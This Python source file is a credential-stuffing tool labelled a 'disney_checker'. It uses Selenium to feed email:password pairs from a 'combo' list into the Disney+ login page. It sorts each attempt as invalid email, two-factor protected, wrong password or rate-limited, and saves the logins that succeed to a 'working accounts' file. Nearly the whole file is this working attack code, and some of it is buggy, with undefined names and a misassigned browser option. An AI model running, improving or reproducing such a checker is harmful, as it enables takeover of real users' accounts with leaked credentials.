import time
import os
import requests
import tkinter
from functools import partial
from split_combos import combo_splitter
from tkinter import *
from tkinter import ttk
from bs4 import BeautifulSoup as soup
from selenium.common.exceptions import NoSuchElementException, ElementClickInterceptedException, InvalidSessionIdException
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from pathlib import Path

class disney_checker():

	def __init__(self, root):

		self.account_checker_message = ''
		self.combo_number = ''
		self.concatenated_info = self.account_checker_message + self.combo_number
		self.checker_printout = Listbox(root, listvariable = self.concatenated_info, height = 18)
		self.file_directory = str(Path(__file__).parent)+'/disney'
		self.page = 'https://www.disneyplus.com/login'
		self.users = []
		self.passwords = []
		self.Two_Factor = False
		self.browser_options = Options()
		self.browser_options.add_argument = ('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')
		#self.browser_options.headless = True
	def split_combo_file(self,root):
		self.split_combos_button = Button(root, text = 'Split Combos', font=('Arial', 12), command= partial(combo_splitter,'disney',root))
		self.split_combos_button.place(x=90, y=35)
		
	def split_username_and_password(self):
		os.makedirs('accounts',exist_ok=True)
		with open(self.file_directory, 'r') as disney:
			for line in disney.readlines():
					self.users.append(line.split(':')[0].strip())
					self.passwords.append(line.split(':')[1].strip())					
	def check_the_accounts(self):
		self.split_username_and_password()
		index = 0
		while index != len(self.users):
			with open('accounts/disney_working_accounts','a') as account_results:
				self.checker_printout.place(x=100,y=100)
				try:
					print('\rTrying Combo {} out of {}'.format(index+1, len(self.users)),end='')
					browser = webdriver.Chrome(options = self.browser_options)
					browser.set_window_size(500,700)
					browser.get(page)
					time.sleep(7)
					email_input_box = browser.find_element_by_xpath('//*[@id="email"]')
					continue_button = browser.find_element_by_xpath('//*[@id="dssLogin"]/div[2]/button')					
					email_input_box.send_keys(users[index])
					if browser.find_elements_by_xpath('//*[@id="onetrust-reject-all-handler"]'):
						gdpr_reject_all = browser.find_element_by_xpath('//*[@id="onetrust-reject-all-handler"]')
						gdpr_reject_all.click()
					continue_button.click()
					time.sleep(3)
					if browser.find_elements_by_xpath('/html/body/div[3]/div/div/h4'):
						email_error = browser.find_element_by_xpath('/html/body/div[3]/div/div/h4').text
						if "We couldn't find an account for that email" in str(email_error):
							print(' | {}:{} ---> Invalid Email'.format(self.users[index],self.passwords[index]))
							error_on_first_page = True
					if browser.find_elements_by_xpath('//*[@id="onboarding_index"]/div/div/form/h3'):
						two_factor_authentication = browser.find_element_by_xpath('//*[@id="onboarding_index"]/div/div/form/h3').text
						if 'Check your email inbox' in str(two_factor_authentication):
							print(" | {}:{} ---> Protected by Two-Factor Authentication".format(self.users[index],self.passwords[index]))
							error_on_first_page = True
					if error_on_first_page != True:
						password_input_box = browser.find_element_by_xpath('//*[@id="password"]')
						login_button = browser.find_element_by_xpath('//*[@id="dssLogin"]/div/button')
						password_input_box.send_keys(self.passwords[index])
						login_button.click()
						time.sleep(5)
						if browser.find_elements_by_xpath('//*[@id="password__error"]'):
							password_or_429_error = browser.find_element_by_xpath('//*[@id="password__error"]').text
							if 'Incorrect Password' in str(password_or_429_error):
								print(" | {}:{} ---> Password is incorrect".format(self.users[index],self.passwords[index]))
							if 'Due to' in str(password_or_429_error):
								#print(password_or_429_error)
								print(" | Login Blocked.")
						if browser.find_elements_by_xpath('//*[@id="remove-main-padding_index"]/div/div/section/h2'):
							valid = browser.find_element_by_xpath('//*[@id="remove-main-padding_index"]/div/div/section/h2').text
							if "Who's watching?" in str(valid):
								print(" | {}:{} ---> Success!".format(self.users[index],self.passwords[index]))
								account_results.write('{}:{} ---> Good Account\n'.format(self.users[index],self.passwords[index]))
					index += 1
					error_on_first_page = False
					browser.close()
				except Exception as e:
					print(e)
					break

